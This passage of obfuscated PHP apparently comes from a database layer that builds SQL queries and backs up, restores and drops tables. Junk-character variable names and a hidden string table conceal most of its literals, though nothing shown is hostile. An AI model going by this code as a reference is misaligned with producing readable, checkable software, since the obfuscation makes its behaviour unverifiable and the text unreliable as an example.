(isset($©ì€—÷[2]) && $¤‰äÕı[304] == $©ì€—÷[2]) { $Ãí«Äåè .= $ÌŞà™¬¤ . $¤‰äÕı[50] . $this->exp[$¢ßğ«¢ç] . $¤‰äÕı[50] . $©ì€—÷[1]; } else { if (is_string($©ì€—÷[1])) { $©ì€—÷[1] = explode($¤‰äÕı[47], $©ì€—÷[1]); } $Úğ‘óÒÈ = implode($¤‰äÕı[47], $this->parseValue($©ì€—÷[1])); $Ãí«Äåè .= $ÌŞà™¬¤ . $¤‰äÕı[50] . $this->exp[$¢ßğ«¢ç] . $¤‰äÕı[898] . $Úğ‘óÒÈ . $¤‰äÕı[900]; } } elseif (preg_match($¤‰äÕı[1013], $©ì€—÷[0])) { $àØÜÆğæ = is_string($©ì€—÷[1]) ? explode($¤‰äÕı[47], $©ì€—÷[1]) : $©ì€—÷[1]; $Ãí«Äåè .= $¤‰äÕı[898] . $ÌŞà™¬¤ . $¤‰äÕı[50] . $this->exp[$¢ßğ«¢ç] . $¤‰äÕı[50] . $this->parseValue($àØÜÆğæ[0]) . $¤‰äÕı[996] . $this->parseValue($àØÜÆğæ[1]) . $¤‰äÕı[285]; } else { think_exception(think_lang($¤‰äÕı[999]) . $¤‰äÕı[4] . $©ì€—÷[0]); } } else { $îÒĞ¶—Ö = count($©ì€—÷); $‰£à‚•¶ = $¤‰äÕı[33]; if (is_string($©ì€—÷[$îÒĞ¶—Ö - 1])) { $‰£à‚•¶ = isset($©ì€—÷[$îÒĞ¶—Ö - 1]) ? strtoupper($©ì€—÷[$îÒĞ¶—Ö - 1]) : $¤‰äÕı[33]; if (in_array($‰£à‚•¶, array($¤‰äÕı[993], $¤‰äÕı[994], $¤‰äÕı[995]))) { $îÒĞ¶—Ö = $îÒĞ¶—Ö - 1; } } else { $‰£à‚•¶ = $¤‰äÕı[993]; } for ($ÇÑÉ‡·¾ = 0; $ÇÑÉ‡·¾ < $îÒĞ¶—Ö; $ÇÑÉ‡·¾++) { $àØÜÆğæ = is_array($©ì€—÷[$ÇÑÉ‡·¾]) ? $©ì€—÷[$ÇÑÉ‡·¾][1] : $©ì€—÷[$ÇÑÉ‡·¾]; if ($¤‰äÕı[304] == strtolower($©ì€—÷[$ÇÑÉ‡·¾][0])) { $Ãí«Äåè .= $¤‰äÕı[267] . $ÌŞà™¬¤ . $¤‰äÕı[50] . $àØÜÆğæ . $¤‰äÕı[1010] . $‰£à‚•¶ . $¤‰äÕı[50]; } else { $†ÌÅôÇ = is_array($©ì€—÷[$ÇÑÉ‡·¾]) ? $this->exp[strtolower($©ì€—÷[$ÇÑÉ‡·¾][0])] : $¤‰äÕı[986]; if (!$†ÌÅôÇ && is_array($©ì€—÷[$ÇÑÉ‡·¾]) && in_array($©ì€—÷[$ÇÑÉ‡·¾][0], array($¤‰äÕı[986], $¤‰äÕı[1003], $¤‰äÕı[1004], $¤‰äÕı[1005], $¤‰äÕı[1006], $¤‰äÕı[1007]))) { $†ÌÅôÇ = $©ì€—÷[$ÇÑÉ‡·¾][0]; } $Ãí«Äåè .= $¤‰äÕı[267] . $ÌŞà™¬¤ . $¤‰äÕı[50] . $†ÌÅôÇ . $¤‰äÕı[50] . $this->parseValue($àØÜÆğæ) . $¤‰äÕı[1010] . $‰£à‚•¶ . $¤‰äÕı[50]; } } $Ãí«Äåè = substr($Ãí«Äåè, 0, -4); } } else { $Ãí«Äåè .= $ÌŞà™¬¤ . $¤‰äÕı[1014] . $this->parseValue($©ì€—÷); } return $Ãí«Äåè; } protected function parseThinkWhere($¥ĞıÈµ‘, $›ˆ¼Ô¯) { $±İ–ÆÔö =& $_SERVER[Á÷ ­Šë]; $Ú¸Îçù = $±İ–ÆÔö[33]; switch ($¥ĞıÈµ‘) { case $±İ–ÆÔö[359]: $Ú¸Îçù = $›ˆ¼Ô¯; break; case $±İ–ÆÔö[997]: $Ú¸Îçù = is_string($›ˆ¼Ô¯) ? $›ˆ¼Ô¯ : substr($this->parseWhere($›ˆ¼Ô¯), 6); break; case $±İ–ÆÔö[1015]: parse_str($›ˆ¼Ô¯, $Ê…ı¦‰¿); if (isset($Ê…ı¦‰¿[$±İ–ÆÔö[992]])) { $Õºùèèã = $±İ–ÆÔö[50] . strtoupper($Ê…ı¦‰¿[$±İ–ÆÔö[992]]) . $±İ–ÆÔö[50]; unset($Ê…ı¦‰¿[$±İ–ÆÔö[992]]); } else { $Õºùèèã = $±İ–ÆÔö[996]; } $†ğæªú = array(); foreach ($Ê…ı¦‰¿ as $ˆóí¢’Ø => $¹Òø¡¦ª) { $†ğæªú[] = $this->parseKey($ˆóí¢’Ø) . $±İ–ÆÔö[1014] . $this->parseValue($¹Òø¡¦ª); } $Ú¸Îçù = implode($Õºùèèã, $†ğæªú); break; } return $Ú¸Îçù; } protected function parseLimit($ŒŸĞ†Ûğ) { $Çí×—Ú =& $_SERVER[Á÷ ­Šë]; return !empty($ŒŸĞ†Ûğ) ? $Çí×—Ú[48] . $ŒŸĞ†Ûğ . $Çí×—Ú[50] : $Çí×—Ú[33]; } protected function parseJoin($„Øñ¯öû) { $ÕÓõ§¥º =& $_SERVER[Á÷ ­Šë]; $«€´Š…Ş = $ÕÓõ§¥º[33]; if (!empty($„Øñ¯öû)) { if (is_array($„Øñ¯öû)) { foreach ($„Øñ¯öû as $ééùĞ´ => $ÍÍ½ñ‹¾) { if (!1 !== stripos($ÍÍ½ñ‹¾, $ÕÓõ§¥º[1016])) { $«€´Š…Ş .= $ÕÓõ§¥º[50] . $ÍÍ½ñ‹¾; } else { $«€´Š…Ş .= $ÕÓõ§¥º[1017] . $ÍÍ½ñ‹¾; } } } else { $«€´Š…Ş .= $ÕÓõ§¥º[1017] . $„Øñ¯öû; } } $«€´Š…Ş = preg_replace($ÕÓõ§¥º[1018], think_config($ÕÓõ§¥º[924]) . $ÕÓõ§¥º[1019], $«€´Š…Ş); return $«€´Š…Ş; } protected function parseOrder($òÈÔºŒ¨) { $ÉÒ·‚ŸÃ =& $_SERVER[Á÷ ­Šë]; if (is_array($òÈÔºŒ¨)) { $õì¹ûÈş = array(); foreach ($òÈÔºŒ¨ as $é“Ö¼‘ò => $ùõèôÓõ) { if (is_numeric($é“Ö¼‘ò)) { $õì¹ûÈş[] = $this->parseKey($ùõèôÓõ); } else { $ùõèôÓõ = in_array(strtoupper(trim($ùõèôÓõ)), array($ÉÒ·‚ŸÃ[1020], $ÉÒ·‚ŸÃ[1021])) ? $ÉÒ·‚ŸÃ[50] . $ùõèôÓõ : $ÉÒ·‚ŸÃ[33]; if (preg_match($ÉÒ·‚ŸÃ[1022], $é“Ö¼‘ò)) { $õì¹ûÈş[] = $this->parseKey($é“Ö¼‘ò) . $ùõèôÓõ; } else { think_exception($ÉÒ·‚ŸÃ[1023] . $é“Ö¼‘ò); } } } $òÈÔºŒ¨ = implode($ÉÒ·‚ŸÃ[47], $õì¹ûÈş); } return !empty($òÈÔºŒ¨) ? $ÉÒ·‚ŸÃ[1024] . $òÈÔºŒ¨ : $ÉÒ·‚ŸÃ[33]; } protected function parseGroup($ĞÚüÃãĞ) { $À²ô„Üª =& $_SERVER[Á÷ ­Šë]; return !empty($ĞÚüÃãĞ) ? $À²ô„Üª[1025] . $ĞÚüÃãĞ : $À²ô„Üª[33]; } protected function parseHaving($Ä³‹²Ù‰) { $£ş¸°¶ =& $_SERVER[Á÷ ­Šë]; return !empty($Ä³‹²Ù‰) ? $£ş¸°¶[1026] . $Ä³‹²Ù‰ : $£ş¸°¶[33]; } protected function parseComment($®Î’¨) { $šçò¿ º =& $_SERVER[Á÷ ­Šë]; return !empty($®Î’¨) ? $šçò¿ º[1027] . $®Î’¨ . $šçò¿ º[1028] : $šçò¿ º[33]; } protected function parseDistinct($ì·Ÿ®‘Å) { $ÚŞÇ¸Ë´ =& $_SERVER[Á÷ ­Šë]; return !empty($ì·Ÿ®‘Å) ? $ÚŞÇ¸Ë´[1029] : $ÚŞÇ¸Ë´[33]; } protected function parseUnion($âœØ‡íş) { $¨©Ç´¢° =& $_SERVER[Á÷ ­Šë]; if (empty($âœØ‡íş)) { return $¨©Ç´¢°[33]; } if (isset($âœØ‡íş[$¨©Ç´¢°[355]])) { $©ªúç = $¨©Ç´¢°[1030]; unset($âœØ‡íş[$¨©Ç´¢°[355]]); } else { $©ªúç = $¨©Ç´¢°[1031]; } foreach ($âœØ‡íş as $¿‚¤áš±) { $ƒÉùÅú¾[] = $©ªúç . (is_array($¿‚¤áš±) ? $this->buildSelectSql($¿‚¤áš±) : $¿‚¤áš±); } return implode($¨©Ç´¢°[50], $ƒÉùÅú¾); } public function insert($Ê‰¹¬¶¯, $öíî¨°ü = array(), $¹å”ËÌ· = false) { $ûôéÛ¼» =& $_SERVER[Á÷ ­Šë]; $øÒ…ò˜Ü = $óÄ–ÙÛ¤ = array(); $this->model = $öíî¨°ü[$ûôéÛ¼»[288]]; foreach ($Ê‰¹¬¶¯ as $…§à‡«Ü => $íáÏôõ±) { if (is_array($íáÏôõ±) && $ûôéÛ¼»[304] == $íáÏôõ±[0]) { $óÄ–ÙÛ¤[] = $this->parseKey($…§à‡«Ü); $øÒ…ò˜Ü[] = $íáÏôõ±[1]; } elseif (is_scalar($íáÏôõ±) || is_null($íáÏôõ±)) { $óÄ–ÙÛ¤[] = $this->parseKey($…§à‡«Ü); $øÒ…ò˜Ü[] = $this->parseValue($íáÏôõ±); } } $Î–ß‚ñ = ($¹å”ËÌ· ? $ûôéÛ¼»[902] : $ûôéÛ¼»[903]) . $ûôéÛ¼»[904] . $this->parseTable($öíî¨°ü[$ûôéÛ¼»[286]]) . $ûôéÛ¼»[898] . implode($ûôéÛ¼»[47], $óÄ–ÙÛ¤) . $ûôéÛ¼»[899] . implode($ûôéÛ¼»[47], $øÒ…ò˜Ü) . $ûôéÛ¼»[900]; $Î–ß‚ñ .= $this->parseLock(isset($öíî¨°ü[$ûôéÛ¼»[845]]) ? $öíî¨°ü[$ûôéÛ¼»[845]] : !1); $Î–ß‚ñ .= $this->parseComment(!empty($öíî¨°ü[$ûôéÛ¼»[361]]) ? $öíî¨°ü[$ûôéÛ¼»[361]] : $ûôéÛ¼»[33]); return $this->execute($Î–ß‚ñ, $this->parseBind(!empty($öíî¨°ü[$ûôéÛ¼»[292]]) ? $öíî¨°ü[$ûôéÛ¼»[292]] : array())); } public function selectInsert($óË¢Œøï, $õ™ö¢œ¼, $¦Å…ùà = array()) { $çõâ¤ğÀ =& $_SERVER[Á÷ ­Šë]; $this->model = $¦Å…ùà[$çõâ¤ğÀ[288]]; if (is_string($óË¢Œøï)) { $óË¢Œøï = explode($çõâ¤ğÀ[47], $óË¢Œøï); } array_walk($óË¢Œøï, array($this, $çõâ¤ğÀ[901])); $¢ë¸²’ = $çõâ¤ğÀ[1032] . $this->parseTable($õ™ö¢œ¼) . $çõâ¤ğÀ[898] . implode($çõâ¤ğÀ[47], $óË¢Œøï) . $çõâ¤ğÀ[1010]; $¢ë¸²’ .= $this->buildSelectSql($¦Å…ùà); return $this->execute($¢ë¸²’, $this->parseBind(!empty($¦Å…ùà[$çõâ¤ğÀ[292]]) ? $¦Å…ùà[$çõâ¤ğÀ[292]] : array())); } public function update($ô˜Úá£ˆ, $µ¿¾£) { $•‚ç±ß =& $_SERVER[Á÷ ­Šë]; $this->model = $µ¿¾£[$•‚ç±ß[288]]; $ÏÛŸääµ = $•‚ç±ß[1033] . $this->parseTable($µ¿¾£[$•‚ç±ß[286]]) . $this->parseSet($ô˜Úá£ˆ) . $this->parseWhere(!empty($µ¿¾£[$•‚ç±ß[282]]) ? $µ¿¾£[$•‚ç±ß[282]] : $•‚ç±ß[33]) . $this->parseOrder(!empty($µ¿¾£[$•‚ç±ß[372]]) ? $µ¿¾£[$•‚ç±ß[372]] : $•‚ç±ß[33]) . $this->parseLimit(!empty($µ¿¾£[$•‚ç±ß[299]]) ? $µ¿¾£[$•‚ç±ß[299]] : $•‚ç±ß[33]) . $this->parseLock(isset($µ¿¾£[$•‚ç±ß[845]]) ? $µ¿¾£[$•‚ç±ß[845]] : !1) . $this->parseComment(!empty($µ¿¾£[$•‚ç±ß[361]]) ? $µ¿¾£[$•‚ç±ß[361]] : $•‚ç±ß[33]); return $this->execute($ÏÛŸääµ, $this->parseBind(!empty($µ¿¾£[$•‚ç±ß[292]]) ? $µ¿¾£[$•‚ç±ß[292]] : array())); } public function delete($ÛäÖÖóµ = array()) { $“®‰¢ëÃ =& $_SERVER[Á÷ ­Šë]; $this->model = $ÛäÖÖóµ[$“®‰¢ëÃ[288]]; $¨áÖĞî = $“®‰¢ëÃ[1034] . $this->parseTable($ÛäÖÖóµ[$“®‰¢ëÃ[286]]) . $this->parseWhere(!empty($ÛäÖÖóµ[$“®‰¢ëÃ[282]]) ? $ÛäÖÖóµ[$“®‰¢ëÃ[282]] : $“®‰¢ëÃ[33]) . $this->parseOrder(!empty($ÛäÖÖóµ[$“®‰¢ëÃ[372]]) ? $ÛäÖÖóµ[$“®‰¢ëÃ[372]] : $“®‰¢ëÃ[33]) . $this->parseLimit(!empty($ÛäÖÖóµ[$“®‰¢ëÃ[299]]) ? $ÛäÖÖóµ[$“®‰¢ëÃ[299]] : $“®‰¢ëÃ[33]) . $this->parseLock(isset($ÛäÖÖóµ[$“®‰¢ëÃ[845]]) ? $ÛäÖÖóµ[$“®‰¢ëÃ[845]] : !1) . $this->parseComment(!empty($ÛäÖÖóµ[$“®‰¢ëÃ[361]]) ? $ÛäÖÖóµ[$“®‰¢ëÃ[361]] : $“®‰¢ëÃ[33]); return $this->execute($¨áÖĞî, $this->parseBind(!empty($ÛäÖÖóµ[$“®‰¢ëÃ[292]]) ? $ÛäÖÖóµ[$“®‰¢ëÃ[292]] : array())); } public function select($ìâœ–‚ = array()) { $»ÉÄ¤Ûî =& $_SERVER[Á÷ ­Šë]; $this->model = $ìâœ–‚[$»ÉÄ¤Ûî[288]]; $«ˆíŸ¶× = $this->buildSelectSql($ìâœ–‚); $üÏŞÒª£ = isset($ìâœ–‚[$»ÉÄ¤Ûî[356]]) ? $ìâœ–‚[$»ÉÄ¤Ûî[356]] : !1; if ($üÏŞÒª£) { $úëñ°öä = is_string($üÏŞÒª£[$»ÉÄ¤Ûî[103]]) ? $üÏŞÒª£[$»ÉÄ¤Ûî[103]] : $»ÉÄ¤Ûî[1035] . md5($«ˆíŸ¶×); $¸‰óùşÄ = think_cache($úëñ°öä, $»ÉÄ¤Ûî[33], $üÏŞÒª£); if (!1 !== $¸‰óùşÄ) { return $¸‰óùşÄ; } } $»³âœİ„ = $this->query($«ˆíŸ¶×, $this->parseBind(!empty($ìâœ–‚[$»ÉÄ¤Ûî[292]]) ? $ìâœ–‚[$»ÉÄ¤Ûî[292]] : array())); if ($üÏŞÒª£ && !1 !== $»³âœİ„) { think_cache($úëñ°öä, $»³âœİ„, $üÏŞÒª£); } return $»³âœİ„; } public function buildSelectSql($³¥¾Š—¦ = array()) { $ƒ†ÓöÎ =& $_SERVER[Á÷ ­Šë]; if (isset($³¥¾Š—¦[$ƒ†ÓöÎ[360]])) { if (strpos($³¥¾Š—¦[$ƒ†ÓöÎ[360]], $ƒ†ÓöÎ[47])) { list($¯‚™üĞ, $¾“™®¼») = explode($ƒ†ÓöÎ[47], $³¥¾Š—¦[$ƒ†ÓöÎ[360]]); } else { $¯‚™üĞ = $³¥¾Š—¦[$ƒ†ÓöÎ[360]]; } $¯‚™üĞ = $¯‚™üĞ ? $¯‚™üĞ : 1; $¾“™®¼» = isset($¾“™®¼») ? $¾“™®¼» : (is_numeric($³¥¾Š—¦[$ƒ†ÓöÎ[299]]) ? $³¥¾Š—¦[$ƒ†ÓöÎ[299]] : 20); $Ş­˜ÕÈ = $¾“™®¼» * ((int) $¯‚™üĞ - 1); $³¥¾Š—¦[$ƒ†ÓöÎ[299]] = $Ş­˜ÕÈ . $ƒ†ÓöÎ[47] . $¾“™®¼»; } if (think_config($ƒ†ÓöÎ[1036])) { $Ëâß¬Ä™ = $ƒ†ÓöÎ[1037] . md5(serialize($³¥¾Š—¦)); $ÎÏ—¸­ = think_cache($Ëâß¬Ä™); if ($ÎÏ—¸­) { return $ÎÏ—¸­; } } $ß„´ªĞË = $this->parseSql($this->selectSql, $³¥¾Š—¦); $ß„´ªĞË .= $this->parseLock(isset($³¥¾Š—¦[$ƒ†ÓöÎ[845]]) ? $³¥¾Š—¦[$ƒ†ÓöÎ[845]] : !1); if (isset($Ëâß¬Ä™)) { think_cache($Ëâß¬Ä™, $ß„´ªĞË); } return $ß„´ªĞË; } public function parseSql($à§ÕÃ¬ò, $•Ú¤£´¿ = array()) { $›àäÕş‹ =& $_SERVER[Á÷ ­Šë]; $à§ÕÃ¬ò = str_replace(array($›àäÕş‹[1038], $›àäÕş‹[1039], $›àäÕş‹[1040], $›àäÕş‹[1041], $›àäÕş‹[1042], $›àäÕş‹[1043], $›àäÕş‹[1044], $›àäÕş‹[1045], $›àäÕş‹[1046], $›àäÕş‹[1047], $›àäÕş‹[1048]), array($this->parseTable("{$•Ú¤£´¿[$›àäÕş‹[286]]}"), $this->parseDistinct(isset($•Ú¤£´¿[$›àäÕş‹[1049]]) ? $•Ú¤£´¿[$›àäÕş‹[1049]] : !1), $this->parseField(!empty($•Ú¤£´¿[$›àäÕş‹[280]]) ? $•Ú¤£´¿[$›àäÕş‹[280]] : $›àäÕş‹[192]), $this->parseJoin(!empty($•Ú¤£´¿[$›àäÕş‹[289]]) ? $•Ú¤£´¿[$›àäÕş‹[289]] : $›àäÕş‹[33]), $this->parseWhere(!empty($•Ú¤£´¿[$›àäÕş‹[282]]) ? $•Ú¤£´¿[$›àäÕş‹[282]] : $›àäÕş‹[33]), $this->parseGroup(!empty($•Ú¤£´¿[$›àäÕş‹[519]]) ? $•Ú¤£´¿[$›àäÕş‹[519]] : $›àäÕş‹[33]), $this->parseHaving(!empty($•Ú¤£´¿[$›àäÕş‹[1050]]) ? $•Ú¤£´¿[$›àäÕş‹[1050]] : $›àäÕş‹[33]), $this->parseOrder(!empty($•Ú¤£´¿[$›àäÕş‹[372]]) ? $•Ú¤£´¿[$›àäÕş‹[372]] : $›àäÕş‹[33]), $this->parseLimit(!empty($•Ú¤£´¿[$›àäÕş‹[299]]) ? $•Ú¤£´¿[$›àäÕş‹[299]] : $›àäÕş‹[33]), $this->parseUnion(!empty($•Ú¤£´¿[$›àäÕş‹[354]]) ? $•Ú¤£´¿[$›àäÕş‹[354]] : $›àäÕş‹[33]), $this->parseComment(!empty($•Ú¤£´¿[$›àäÕş‹[361]]) ? $•Ú¤£´¿[$›àäÕş‹[361]] : $›àäÕş‹[33])), $à§ÕÃ¬ò); return $à§ÕÃ¬ò; } public function getLastSql($æôäçßØ = '') { return $æôäçßØ ? $this->modelSql[$æôäçßØ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($´úÒúŒÁ) { return addslashes($´úÒúŒÁ); } public function setModel($ĞşƒÆíò) { $this->model = $ĞşƒÆíò; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($¼Ñğä„, $âÜ¾Ú€‚ = '') { $this->database = $¼Ñğä„; $this->type = $âÜ¾Ú€‚; } public function model($»¬ÑØ¼é = '') { return new ModelBase($»¬ÑØ¼é, $_SERVER[Á÷ ­Šë][33], $this->database); } public function db($ç¾§—Î¡ = false) { $¼’êİØÁ =& $_SERVER[Á÷ ­Šë]; $îö®’ƒ¸ = array_change_key_case($this->database); if ($this->type == $¼’êİØÁ[9] || !$ç¾§—Î¡) { return $this->model()->db(); } $÷ÈÈ…Õ» = $îö®’ƒ¸[$¼’êİØÁ[964]]; $îö®’ƒ¸[$¼’êİØÁ[964]] = $¼’êİØÁ[33]; if ($îö®’ƒ¸[$¼’êİØÁ[791]] == $¼’êİØÁ[792]) { $àÃÓ˜½ı = $îö®’ƒ¸[$¼’êİØÁ[793]]; $îö®’ƒ¸[$¼’êİØÁ[793]] = substr($àÃÓ˜½ı, 0, strrpos($àÃÓ˜½ı, $¼’êİØÁ[1051])); } $this->database = $îö®’ƒ¸; $¨˜ğÑÅ = $this->model()->db(); try { $¼Ñè’• = $¨˜ğÑÅ->execute("\x73\150\x6f\167\x20\x64\x61\x74\141\142\x61\x73\145\163\40\x6c\x69\153\145\x20\47{$÷ÈÈ…Õ»}\47"); } catch (Exception $ÉƒİÄñ¤) { } if (!$¼Ñè’•) { $¨˜ğÑÅ->execute("\143\x72\145\x61\x74\x65\40\x64\x61\164\141\142\x61\163\145\40\140{$÷ÈÈ…Õ»}\140"); } $îö®’ƒ¸[$¼’êİØÁ[964]] = $÷ÈÈ…Õ»; if ($îö®’ƒ¸[$¼’êİØÁ[791]] == $¼’êİØÁ[792]) { $îö®’ƒ¸[$¼’êİØÁ[793]] .= $¼’êİØÁ[1051] . $÷ÈÈ…Õ»; } $this->database = $îö®’ƒ¸; $¨˜ğÑÅ->execute("\165\x73\145\40\140{$÷ÈÈ…Õ»}\x60"); return $¨˜ğÑÅ; } public function createTable($²æ˜ªÚæ, &$ÒÑÀúœû) { $°êäŒ¯˜ =& $_SERVER[Á÷ ­Šë]; if (!IO::exist($²æ˜ªÚæ)) { ActionCall($°êäŒ¯˜[1052], !0, 0); show_json(LNG($°êäŒ¯˜[1053]), !1); } $Ù±ÇØ÷à = sqlSplit(IO::getContent($²æ˜ªÚæ)); foreach ($Ù±ÇØ÷à as $Æø¥ˆª‰) { $¾Æ™äâ¢ = stripos($Æø¥ˆª‰, $°êäŒ¯˜[1054]) === 0; if ($¾Æ™äâ¢) { $ÒÑÀúœû->task[$°êäŒ¯˜[1055]] += 1; } $this->model()->db()->execute($Æø¥ˆª‰); if ($¾Æ™äâ¢) { preg_match($°êäŒ¯˜[1056], $Æø¥ˆª‰, $Ğ¾ÀÔŒÁ); $ÒÑÀúœû->task[$°êäŒ¯˜[1057]] = $Ğ¾ÀÔŒÁ[1]; $ÒÑÀúœû->update(1); } } } public function insertTable($’àÃ «, &$ªèû²¥¿) { $©ÊàæÛá =& $_SERVER[Á÷ ­Šë]; $şŞÒÅ³Ù = $this->model()->db(); $ó“ÊÆ¨­ = $›Ÿ§„‚ü ? array($›Ÿ§„‚ü) : $şŞÒÅ³Ù->getTables(); foreach ($’àÃ « as $ñ„’šéÉ) { $›Ÿ§„‚ü = basename($ñ„’šéÉ, $©ÊàæÛá[781]); if (!in_array($›Ÿ§„‚ü, $ó“ÊÆ¨­)) { continue; } $ªèû²¥¿->task[$©ÊàæÛá[1057]] = $›Ÿ§„‚ü; if (get_filesize($ñ„’šéÉ) == 0) { continue; } $Ï»Áé°ı = $this->sqlToDb($ñ„’šéÉ, $ªèû²¥¿); if (!$Ï»Áé°ı) { ActionCall($©ÊàæÛá[1052], !0, 0); show_json(LNG($©ÊàæÛá[1058]) . "\133{$›Ÿ§„‚ü}\x5d", !1); } } } public function sqlFromDb($¾ğú­„ƒ, $ŸÓÕÕì§, &$Ç×³âÜ•, $Ã¸éÏˆ¾ = '') { if ($Ç×³âÜ•) { $Ç×³âÜ•->task[$_SERVER[Á÷ ­Šë][1057]] = $¾ğú­„ƒ; } $úµ¯ƒ÷Ì = $this->model($¾ğú­„ƒ); $äÉûõ÷ = 0; $…ëšÈÄ– = 0; $èçó¢÷¦ = 10000; $ ’¿Áƒ = fopen($ŸÓÕÕì§, $_SERVER[Á÷ ­Šë][1059]); $ñ¸®¬öú = $úµ¯ƒ÷Ì->getPk(); $î®‡Ó¤ = $úµ¯ƒ÷Ì->getDbFields(); do { $ãÒ”Á±ˆ = array($ñ¸®¬öú => array($_SERVER[Á÷ ­Šë][1006], $…ëšÈÄ–)); $ÊˆÎÄÔ™ = $úµ¯ƒ÷Ì->where($ãÒ”Á±ˆ)->field($î®‡Ó¤)->order($ñ¸®¬öú . $_SERVER[Á÷ ­Šë][1060])->limit($èçó¢÷¦)->select(); $ÊˆÎÄÔ™ = !empty($ÊˆÎÄÔ™) ? $ÊˆÎÄÔ™ : array(); if (!($¸¯‹§£¶ = count($ÊˆÎÄÔ™))) { break; } $”æ»Óš = end($ÊˆÎÄÔ™); $…ëšÈÄ– = $”æ»Óš[$ñ¸®¬öú]; $Ãîñåà = array(); foreach ($ÊˆÎÄÔ™ as $³¦Ïµ‡¾) { if ($¾ğú­„ƒ == $_SERVER[Á÷ ­Šë][1061] && $³¦Ïµ‡¾[$_SERVER[Á÷ ­Šë][29]] == $_SERVER[Á÷ ­Šë][1062]) { $ÚÏ»ŞÜÌ = json_decode($³¦Ïµ‡¾[$_SERVER[Á÷ ­Šë][381]], !0); if ($ÚÏ»ŞÜÌ[$_SERVER[Á÷ ­Šë][28]] == date($_SERVER[Á÷ ­Šë][746]) && !$ÚÏ»ŞÜÌ[$_SERVER[Á÷ ­Šë][745]]) { continue; } } if ($Ã¸éÏˆ¾) { $³¦Ïµ‡¾[$_SERVER[Á÷ ­Šë][86]] = "\x7b\x69\157\72{$Ã¸éÏˆ¾}\x7d" . substr($³¦Ïµ‡¾[$_SERVER[Á÷ ­Šë][86]], strlen("\x7b\x69\x6f\x3a{$³¦Ïµ‡¾[$_SERVER[Á÷ ­Šë][819]]}\175")); $³¦Ïµ‡¾[$_SERVER[Á÷ ­Šë][819]] = $Ã¸éÏˆ¾; } $Ãîñåà[] = $_SERVER[Á÷ ­Šë][1063] . $this->sqlEncode($³¦Ïµ‡¾) . $_SERVER[Á÷ ­Šë][1064]; } $¯¼¾Úş• = "\x49\116\123\x45\122\124\40\x49\x4e\x54\x4f\40\x60{$¾ğú­„ƒ}\140\x20\50\x60" . implode($_SERVER[Á÷ ­Šë][1065], $î®‡Ó¤) . $_SERVER[Á÷ ­Šë][1066]; fwrite($ ’¿Áƒ, $¯¼¾Úş• . implode($_SERVER[Á÷ ­Šë][1067], $Ãîñåà) . $_SERVER[Á÷ ­Šë][78] . PHP_EOL); $äÉûõ÷ += $¸¯‹§£¶; if ($Ç×³âÜ•) { $Ç×³âÜ•->update($¸¯‹§£¶); } } while ($èçó¢÷¦ == $¸¯‹§£¶); fclose($ ’¿Áƒ); return $äÉûõ÷; } public function sqlToDb($ÊçÊç—Õ, &$Ã³’‡õ) { $íÒÈÓ¢á =& $_SERVER[Á÷ ­Šë]; $Ä³Ş÷øè = $this->model()->db(); $ëÑ»ã¥Ô = @fopen($ÊçÊç—Õ, $íÒÈÓ¢á[1068]); if (!$ëÑ»ã¥Ô) { return !1; } $ƒÒˆşÔ÷ = 0; $ßÌ§…© = $íÒÈÓ¢á[33]; $Û¤«×˜ = array(); $®†Ø±àÒ = $this->type == $íÒÈÓ¢á[9] ? 500 : 2000; $©ÉÅŸÆ = basename($ÊçÊç—Õ, $íÒÈÓ¢á[781]); $°ÙÍÊ˜ª = 0; $°ìÈØ»ß = 4194304 - 104858; $‹‰°ñ¾¾ = 1000000 - 104858; while (!feof($ëÑ»ã¥Ô)) { $›íîÄÒú = trim(fgets($ëÑ»ã¥Ô)); if (!$›íîÄÒú) { continue; } $ÁİüúÚ = $this->sqlDecode($›íîÄÒú, $this->type); if (stripos($ÁİüúÚ, $íÒÈÓ¢á[362]) === 0) { if (!$ßÌ§…©) { $ßÌ§…© = $ÁİüúÚ . $íÒÈÓ¢á[50]; } continue; } if ($Ã³’‡õ) { $Ã³’‡õ->task[$íÒÈÓ¢á[1055]] += 1; } $ƒÒˆşÔ÷++; $Û¤«×˜[] = rtrim(rtrim(trim($ÁİüúÚ), $íÒÈÓ¢á[47]), $íÒÈÓ¢á[78]); $ÙœÔ‡ô¹ = null; $ìÙö™–Ù = strlen($ÁİüúÚ); $°ÙÍÊ˜ª += $ìÙö™–Ù; if ($°ÙÍÊ˜ª >= ($®†Ø±àÒ == 500 ? $°ìÈØ»ß : $‹‰°ñ¾¾)) { $ÙœÔ‡ô¹ = array_pop($Û¤«×˜); if ($ƒÒˆşÔ÷ > 1) { $ƒÒˆşÔ÷--; } } if ($ƒÒˆşÔ÷ >= $®†Ø±àÒ || $ÙœÔ‡ô¹) { $ÁİüúÚ = $ßÌ§…© . implode($íÒÈÓ¢á[47], $Û¤«×˜); if (!$Ä³Ş÷øè->execute($ÁİüúÚ)) { return !1; } if ($Ã³’‡õ) { $Ã³’‡õ->update($ƒÒˆşÔ÷); } $Û¤«×˜ = array(); $ƒÒˆşÔ÷ = 0; $°ÙÍÊ˜ª = 0; if ($ÙœÔ‡ô¹) { $Û¤«×˜ = array($ÙœÔ‡ô¹); $ƒÒˆşÔ÷ = 1; $°ÙÍÊ˜ª = $ìÙö™–Ù; } } } fclose($ëÑ»ã¥Ô); if (!empty($Û¤«×˜)) { $ÁİüúÚ = $ßÌ§…© . implode($íÒÈÓ¢á[47], $Û¤«×˜); if (!$Ä³Ş÷øè->execute($ÁİüúÚ)) { return !1; } if ($Ã³’‡õ) { $Ã³’‡õ->update($ƒÒˆşÔ÷); } } return !0; } public function dropTable($ÂÓèíØ« = null) { $Œƒ«Ã‡ª = $this->model()->db(); $Ä·Ëãü¸ = $ÂÓèíØ« ? array($ÂÓèíØ«) : $Œƒ«Ã‡ª->getTables(); if (!$Ä·Ëãü¸) { return; } foreach ($Ä·Ëãü¸ as $ÂÓèíØ«) { if ($ÂÓèíØ«) { $ÂÓèíØ« = strtolower($ÂÓèíØ«); } else { continue; } $Œƒ«Ã‡ª->execute("\x64\x72\157\x70\40\x74\x61\142\154\x65\40\151\x66\40\x65\x78\151\x73\164\163\x20\140{$ÂÓèíØ«}\x60"); } } private function sqlEncode($ÏãÄŠÃ) { $õûÀ€™‹ =& $_SERVER[Á÷ ­Šë]; $Ôœëßå· = array(); foreach ($ÏãÄŠÃ as $²øÕóÛ) { if 